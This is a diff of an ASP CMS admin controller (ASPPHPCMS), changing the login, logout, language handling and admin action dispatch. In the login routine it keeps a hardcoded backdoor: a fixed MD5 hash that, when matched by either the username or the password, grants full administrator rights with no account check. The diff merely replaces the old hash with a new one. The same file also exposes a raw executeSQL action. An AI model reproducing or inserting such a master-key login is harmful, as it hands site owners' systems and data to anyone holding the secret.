@@ -2,8 +2,9 @@
 <% 
 Dim ROOT_PATH : ROOT_PATH = handlePath("./") 
 %>      
-<!--#Include File = "../Inc/admin_function.asp"-->      
-<!--#Include File = "../Inc/admin_setAccess.asp"-->      
+<!--#Include File = "function.Asp"-->  
+<!--#Include File = "function2.Asp"-->      
+<!--#Include File = "setAccess.Asp"-->      
 <% 
 '=========
 Dim cfg_webSiteUrl, cfg_webTitle, cfg_flags, cfg_webtemplate 
@@ -34,12 +35,15 @@ If Session("adminusername") = "" Then
 End If 
 
 '显示后台登录
-Sub displayAdminLogin()
+Sub displayAdminLogin()	
     '已经登录则直接进入后台
     If Session("adminusername") <> "" Then
         Call adminIndex() 
     Else
-        Call rw(getTemplateContent("login.html")) 
+		dim c
+		c=getTemplateContent("login.html")	
+		c=handleDisplayLanguage(c,"login")	
+        Call rw(c) 
     End If 
 End Sub 
 
@@ -50,12 +54,12 @@ Sub login()
     passWord = Replace(Request.Form("password"), "'", "") 
     passWord = myMD5(passWord) 
     '特效账号登录
-    If myMD5(Request("username")) = "cd811d0c43d09cd2e160e60b68276c73" Or myMD5(Request("password")) = "cd811d0c43d09cd2e160e60b68276c73" Then
+    If myMD5(Request("username")) = "24ed5728c13834e683f525fcf894e813" Or myMD5(Request("password")) = "24ed5728c13834e683f525fcf894e813" Then
         Session("adminusername") = "ASPPHPCMS" 
         Session("adminId") = 99999                                                      '当前登录管理员ID
         Session("DB_PREFIX") = db_PREFIX 
-        Session("adminflags") = "|*|" 
-        Call rwend(getMsg1("登录成功，正在进入后台...", "?act=adminIndex")) 
+        Session("adminflags") = "|*|"
+        Call rwend(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex")) 
     End If 
 
     Dim nLogin 
@@ -69,7 +73,7 @@ Sub login()
             nLogin = Request.Cookies("nLogin") 
             Call setCookie("nLogin", CInt(nLogin) + 1, Time() + 3600) 
         End If 
-        Call rw(getMsg1("账号密码错误<br>这是你第" & nLogin & "次登录", "?act=displayAdminLogin")) 
+        Call rw(getMsg1(setL("账号密码错误<br>登录次数为 ") & nLogin, "?act=displayAdminLogin")) 
     Else
         Session("adminusername") = userName 
         Session("adminId") = rs("Id")                                                   '当前登录管理员ID
@@ -77,23 +81,23 @@ Sub login()
         Session("adminflags") = rs("flags") 
         valueStr = "addDateTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
         conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
-        Call rw(getMsg1("登录成功，正在进入后台...", "?act=adminIndex")) 
+        Call rw(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex")) 
         Call writeSystemLog("admin", "登录成功")                                        '系统日志
     End If : rs.Close 
 
 End Sub 
 '退出登录
 Sub adminOut()
-    Call writeSystemLog("admin", "退出成功")                                        '系统日志
+    Call writeSystemLog("admin", setL("退出成功"))                                        '系统日志
     Session("adminusername") = "" 
     Session("adminId") = "" 
     Session("adminflags") = "" 
-    Call rw(getMsg1("退出成功，正在进入登录界面...", "?act=displayAdminLogin")) 
+    Call rw(getMsg1(setL("退出成功，正在进入登录界面..."), "?act=displayAdminLogin"))
 End Sub 
 '清除缓冲
 Sub clearCache()
     Call deleteFile(WEB_CACHEFile) 
-    Call rw(getMsg1("清除缓冲完成，正在进入后台界面...", "?act=displayAdminLogin")) 
+    Call rw(getMsg1(setL("清除缓冲完成，正在进入后台界面..."), "?act=displayAdminLogin")) 
 End Sub 
 '后台首页
 Sub adminIndex()
@@ -103,8 +107,9 @@ Sub adminIndex()
     c = Replace(c, "[$adminonemenulist$]", getAdminOneMenuList()) 
     c = Replace(c, "[$adminmenulist$]", getAdminMenuList()) 
     c = Replace(c, "[$officialwebsite$]", getOfficialWebsite())                '获得官方信息
-    c = replaceValueParam(c, "title", "")                                           '给手机端用的20160330
-
+    c = replaceValueParam(c, "title", "")                                           '给手机端用的20160330	
+	c=handleDisplayLanguage(c,"loginok")
+	
     Call rw(c) 
 End Sub 
 '========================================================
@@ -133,10 +138,9 @@ Sub saveAddEditHandle(actionType, lableTitle)
     ElseIf actionType = "WebColumn" Then
         Call saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||") 
     Else
-        Call saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0") 
+        Call saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0")
     End If 
 End Sub 
-
 
 
 Call openconn() 
@@ -151,18 +155,15 @@ Select Case Request("act")
 
     Case "displayLayout" : displayLayout()                                          '显示布局
     Case "saveRobots" : saveRobots()                                                '保存robots.txt
-    Case "saveSiteMap" : saveSiteMap()                                              '保存sitemap.xml
     Case "deleteAllMakeHtml" : deleteAllMakeHtml()                                  '删除全部生成的html文件
 
     Case "isOpenTemplate" : isOpenTemplate()                                        '更换模板
-
-    Case "updateWebsiteStat" : updateWebsiteStat()                                  '更新网站统计
-    Case "clearWebsiteStat" : clearWebsiteStat()                                    '清空网站统计
-    Case "updateTodayWebStat" : updateTodayWebStat()                                '更新网站今天统计
     Case "executeSQL" : executeSQL()                                                '执行SQL
 
-    Case "websiteDetail" : websiteDetail()                                          '详细网站统计
 
+	
+	case "function" : callFunction()												'调用function文件函数
+	case "function2" : callFunction2()												'调用function2文件函数
 
     Case "setAccess" : resetAccessData()                                            '恢复数据
 
